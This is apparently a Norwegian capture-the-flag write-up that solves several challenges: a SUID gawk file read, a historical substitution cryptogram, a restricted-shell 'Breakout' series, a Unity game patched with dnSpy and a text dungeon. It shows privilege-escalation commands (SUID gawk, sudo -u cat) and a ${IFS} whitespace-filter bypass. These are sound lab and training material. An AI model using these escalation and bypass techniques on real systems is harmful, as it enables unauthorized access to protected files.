# Writeup av et utvalg oppgaver


## 1.6 Unchained
Her var det om å lese en fil som kun root kunne lese. Det viste seg at gawk hadde SUID-bit satt, som betyr at gawk kjører med samme rettigheter som root  
`gawk '//' secret.txt`  
[GTFObins (ressurs for utnyttelse av binærfiler på Linux)](https://gtfobins.github.io/gtfobins/gawk/#file-read)  

<br>
<br>

## 1.8 Kryptogram
Oppgavetekst:
````md
# Kryptogram

Er du vår neste Egil Mørk? Tiden skrus tilbake til den mørke dagen 23. november 1935.

Som det vil sees er knekningen av et kryptogram ingen heksekunst,
men det krever litt tålmodighet og at man prøver seg frem og tar fantasien til hjelp.

Benevnelser og arbeidsmetoder kan kanskje virke litt fremmed i første øyeblikk, 
men setter man seg inn i saken, er den i virkeligheten enkel.

Du kan hente kryptogrammet her: 

```sh
nc kryptogram 1337
```

Besvarelsen du sender inn, finner du i innholdet av meldingen.

````

Denne oppgaven brukte jeg altfor lang tid på...  
Tilkobling til kryptogram ga oss dette kryptogrammet:
`øwbxl hjcbx læxmx fpxfx lmrcb xlpxo rvøpl rlvrc hrjlø cjxøp brdrb xbræs xlxbb xfhxl yxocx lwfxy øvwjf dryxf xjhhy føvæf apxcp jyxjf yxbøb bxfoj jmwfx mjdxf`

Det ble i oppgaveteksten hintet om den mørke dagen 23. november 1935 og Egil Mørk. Etter litt googling fant jeg boken "Svartkammeret", en bok av Alf R. Jacobsen og Egil Mørk. Boken ligger på Nasjonalbibliotekets nettsider: https://www.nb.no/items/62e1214022fd94e36cc425d1bee9542d?page=15&searchText=magasinet.
Her finnes det også søkemuligheter, så jeg søkte på 23. november 1935. Kapittel 2 (side 16) forteller om Aftenpostens A-Magasin denne lørdagen, og om den kryptologiske nøtten Roscher Lund hadde laget for å rekruttere sivile til etteretningstjenesten.

På side 18 ser man noe som ligner veldig på det vi får fra oppgaven:
`æsxic oawbw jfcdø fxfla æføvb rjfyx løwbx ihjcb ximxy yxoxf øbyxf wøoyb wrfxc hfxiv æjmæx fræsx lalyx foawb ølvvfx hxbwf xyøvm xlabx ldrfp lriv`
Og på side 25 i samme bok er fasiten. Så da lagde jeg et alfabet basert på kryptogrammet og løsningen i boken, og brukte samme alfabet for å løse oppgaven. Noen bokstaver var ikke substituert i det hele tatt:

```
aftenposten bemerker en mistenkelig akning i spionasoeaktivitet i byen etter pendelsen fredag
for videre oppdrag brukes kodeordet atterloom fremover
```
Bokstavene ø, j, og h ble i tillegg til å være subsitutter, også brukt som sine faktiske bokstavverdier.

Besvarelsen som skulle sendes inn: `atterloom`

<br>
<br>

## 1.10 Breakout
```sh
breakout:~$ ls -la
total 4
dr-x------    1 user1    user1           23 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw----r--    1 root     root            27 Jan  3 12:43 user1.txt
breakout:~$ cat user1.txt
user2:o4gtOGV3RqVdyUsmDKQv
```
Rolig start. Liste ut filer med `ls -la` og lese med `cat`  



```sh
breakout:~$ ls -la
total 4
dr-x------    1 user2    user2           24 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw----r--    1 root     root            27 Jan  3 12:43 .user2.txt
breakout:~$ cat .user2.txt
user3:LBIcoc6SlhBcvu9t0lzT
```
Her må vi bruke flagget `-a` for å liste ut skjulte filer (filer som starter med .)  



```sh
breakout:~$ ls -la
total 4
dr-x------    1 user3    user3           32 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw----r--    1 root     root           184 Dec 16 21:14 note.txt
dr-x-----x    1 root     root            38 Dec 16 21:14 secret_information
breakout:~$ cat note.txt
At long last I found the secret information
It has always been my greatest goal
But at the end of it all I was told
The rumoured super_secret_information
Still remains elusive as ever
breakout:~$ cat secret_information/super_secret_information/
transaction.png  user3.txt
breakout:~$ cat secret_information/super_secret_information/user3.txt
user4:h25zsqs8hir07g7LaDS4
```
user3 har ikke lov til å cd inn i secret_information, men vi kan åpne filer i mappen hvis vi vet hele filstien. `note.txt` inneholder hintet "super_secret_information".
Dette viser seg å være en mappe inni `secret_information`. Hvis vi skriver `secret_information/super_secret_information/` og trykker TAB, får vi opp filene som vi kan åpne.   



```sh
breakout:~$ ls -la
total 4
dr-x--x---    1 user4    nisser          23 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw-r-----    1 root     nisser          27 Jan  3 12:43 user4.txt
breakout:~$ sudo -l
User user4 may run the following commands on breakout:
    (julenissen) NOPASSWD: /bin/cat
breakout:~$ sudo -u julenissen cat user4.txt
user5:ogjnfkHdpRPmt8XXiSnf
```
`user4.txt` kan kun leses av `root` og brukere i gruppen `nisser`.
user4 kan kjøre cat som brukeren "julenissen", som er medlem av gruppen `nisser`.   



```sh
user5@breakout:~$ /bin/ls -la
total 16
dr-x------    1 user5    user5           23 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw-r--r--    1 root     root          1195 Dec 16 21:14 .bash_profile
-rw-r--r--    1 root     root           711 Dec 16 21:14 .bashrc
-rw-r--r--    1 root     root            61 Dec 16 21:14 .inputrc
drwxr-xr-x    2 root     root            16 Dec 16 21:14 bin
-rw----r--    1 root     root            27 Jan  3 12:43 user5.txt
user5@breakout:~$ /bin/cat user5.txt
user6:2QOytpVP7wChBxNityXy
```
Her mener jeg å huske at PATH ikke var satt til noe, dermed kunne man ikke skrive kommandoer uten deres fulle sti.  



```sh
~$ ls -la
No whitespace allowed
~$ ls${IFS}-la
total 8
dr-x------    1 user6    user6           33 Jan  3 12:43 .
drwxr-xr-x    1 root     root           102 Dec 16 21:14 ..
-rw-r--r--    1 root     root            47 Dec 16 21:14 .bash_profile
dr-x---r-x    1 root     root             6 Dec 16 21:14 bin
-rw----r--    1 root     root            33 Jan  3 12:43 flag.txt
~$ cat${IFS}flag.txt
e7579025bd04dcc762653e31679ss
```
Man kan erstatte mellomrom med `${IFS}`.  

<br>
<br>

## 1.15 Missile Command
Oppgavetekst:
```md
# Missile Command

Spillet virker veldig vanskelig. Kanskje du kan jukse?
```
Dette var en veldig gøy oppgave, kunne gjerne vært større. 

Dette er et 2D-spill hvor målet er å skyte ned alle missilene. Det er game over hvis ett av missilene kommer over til den andre siden. Spillet lar seg ikke vinne uten juks.
Spillet er skrevet i Unity (.NET), som betyr at det lar seg enkelt dekompileres av et verktøy som dnSpy (https://github.com/dnSpy/dnSpy). Med dette verktøyet kan man også endre på metoder og rekompilere spillet med ny funksjonalitet (juks).
Det viser seg at det er flere måter å jukse på, og dermed motta flagget.

I koden henvises det til `SceneManager.LoadScene("Win");`. Når siste missil er skutt ned, lastes scenen "Win" og flagget vises. Det er totalt 16 missiler som skal skytes ned, og spillet er laget slik at det er en forsinkelse (3sek) mellom hver gang brukeren kan skyte. 
Ved å fjerne denne forsinkelsen, kan man skyte flere anti-missiler og dermed vinne spillet.

Dersom man ikke ønsker å spille i det hele tatt, så kan man plassere `SceneManager.LoadScene("Win");` i en av Update()-metodene, og dermed motta flagget med en gang spillet starter.

<br>
<br>

## 1.16 Legend of Vexillum
Dette er et tekstbasert "dungeon"-spill, hvor målet er besøke ulike rom og samle og kombinere diverse gjenstander som gir nye gjenstander. 
Når man besøker nye rom, kan man velge å enten se i rommet, gå til en dør eller område, ta en gjenstand eller bruke en eller flere gjenstander. Eksempel på resultat av å se i rommet:
```
dungeon_prison: You are in a cold dark room, the walls are angled out to a point behind you. There is a door in front of you. In the room there is a torch, and a paper.
```
Det var en del rom, så for å gjøre det litt lettere for meg selv, lagde jeg meg en klient i Python hvor jeg kunne besøke rom og brute force kombinasjoner av gjenstander. Selve flagget får man dersom man besøker rommet `eye_room`
```
eye_room: You are in a small, dark room. The only light comes from above, through the ceiling you can see dcee2dbef8ad3dc077ba21dacafb9a97
```

Jeg fant flagget altså relativt kjapt, og antok derfor at det lå et skjult flagg ved fullførelse av spillet. Så jeg kjørte Python-scriptet gjentatte ganger for å produsere nye gjenstander.
```
[+] Used item '@spiked sphere' with '@speaking wall' in room 'central_hall' successfully!
You squeeze the sphere until you pierce the skin. Slowly, the speech begins making sense. It says 'Find the coiled rod in the brightest land and return it to its primordial waters.
```
Til slutt dukket det opp et skjult flagg, og et høflig takk for at jeg fullførte spillet.

<br>
<br>

## 2.6 Cplusminus

